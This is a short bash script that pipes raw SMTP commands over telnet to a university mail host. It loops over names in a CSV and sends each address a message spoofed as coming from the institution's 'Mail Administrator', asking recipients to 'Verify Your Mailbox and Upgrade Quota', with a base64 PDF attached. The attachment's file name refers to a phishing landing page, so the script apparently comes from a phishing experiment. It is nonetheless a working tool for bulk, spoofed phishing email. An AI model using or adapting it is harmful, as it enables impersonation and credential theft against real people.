#!/bin/bash

myfile = `cat /home/mamoun/cyber_landing_page_for_phishing_exp.pdf|base64`
BOUNDARY=`date +%s|md5sum|awk '{print $1;}'`
MIMETYPE=`file --mime-type -b /home/mamoun/cyber_landing_page_for_phishing_exp.pdf`

(
sleep 2
echo helo usr
sleep 2
IFS=","
while read col1 col2
	do
	echo "MAIL FROM:MailAdministrator<mailadministrator@anu.edu.au>"
	sleep 2
	echo "RCPT TO:${col1}@anu.edu.au"
	sleep 2
	echo "Data"
	sleep 2
	echo "From: Mail Administrator <mailadministrator@anu.edu.au>"
	sleep 2
	echo "To: ${col1}@anu.edu.au;"
	sleep 2
	echo "Subject: Verify Your Mailbox and Upgrade Quota"
	sleep 2
	echo "Mime-Version: 1.0;"
	sleep 2
	echo "Content-Type: multipart/mixed; boundary=\"$BOUNDARY"""
	echo "This is a mime formatted message. If you can read this, this thing doesn't support MIME formatted messages. Soz."
	echo "--$BOUNDARY"
	echo "Content-Type: text/html; charset="ISO-8859-1";"
	sleep 2
	echo "Content-Transfer-Encoding: 7bit;"
	sleep 2
	echo "<html>"
	echo "<body>"
	echo "<p>If you can read this I can sort of send attachments. Maybe.Ish.</p>"
	echo "</body>"
	echo "</html>"
	sleep 2
	echo "--$BOUNDARY"
	echo "Content-Type: $MIMETYPE; name=\"testname\""
	echo "Content-Transfer-Encoding: base64"
	echo "Content-Disposition: attachment; filename=\"testname\";"
	echo "$myfile"
	echo "--$BOUNDARY"
	echo "."
	sleep 2
done < justgrigori.csv
)|telnet smtphost.anu.edu.au 25
